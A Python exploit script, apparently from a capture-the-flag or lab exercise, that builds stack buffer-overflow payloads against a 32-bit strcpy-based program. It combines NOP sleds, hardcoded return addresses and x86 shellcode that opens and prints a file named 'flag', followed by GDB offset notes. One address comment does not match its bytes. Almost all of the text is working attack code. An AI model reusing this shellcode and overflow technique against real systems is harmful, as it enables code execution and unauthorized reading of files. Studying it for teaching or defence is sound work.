#!/usr/bin/env python3

# stop at 31 db 39 c3 -> after 'read' syscall
SHELLCODE = \
b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x36\x5e\x31\xc0\xb0\x05\x89" + \
b"\xf3\x31\xc9\xcd\x80\x89\xc6\xeb\x07\x31\xdb\x89\xd8\x40\xcd\x80" + \
b"\xb0\x03\x89\xf3\x4c\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3" + \
b"\x74\xe7\xb0\x04\xb3\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x44\xeb\xe0" + \
b"\xe8\xc5\xff\xff\xff\x66\x6c\x61\x67\x0a\x90\x90"  # length = 4 * 19

# strcpy need a 0x00 or 0x0a as terminator

nop = b"\x90\x90\x90\x90"

BufferAddr = b"\x80\xc6\xff\xff"  # Buffer Address = 0xffffca36 little endian

EspAddrGDB = b"\x90\xc6\xff\xff"  # Within GDB esp ffffc690

EspAddr    = b"\xe0\xc6\xff\xff"  # esp ffffc6e0

# overflow position = buffer length + 12 = 0x100 + 12 = 256 + 12 = 4 * 67

# Jump to Buffer
arg = 45*nop + SHELLCODE + 3*nop + BufferAddr + 19*nop

# Jump to next byte
arg2 = 67*nop + EspAddrGDB + SHELLCODE

# Test
arg3 = 66*nop + b"AAAA" + b"BBBB" + 19*nop

with open("readflag_buffer.bin", 'wb') as fout:
    fout.write(arg)

with open("readflag_esp.bin", 'wb') as fout:
    fout.write(arg2)

with open("readflag_test.bin", 'wb') as fout:
    fout.write(arg3)
# GDB 
# strcpy src addr: 0xffffc9ea (in argv)
# strcpy buf addr: 0xffffc580

# overwrite by AAAA... to see segfalt, and exam $esp, outside: c720  inside:c6e0, OFFSET = 0x40    V
# when unset COLUMNS, c6f0

# buffer inside: ca32 --> outside: ca72
# buffer inside: c5d0 --> outside: c610


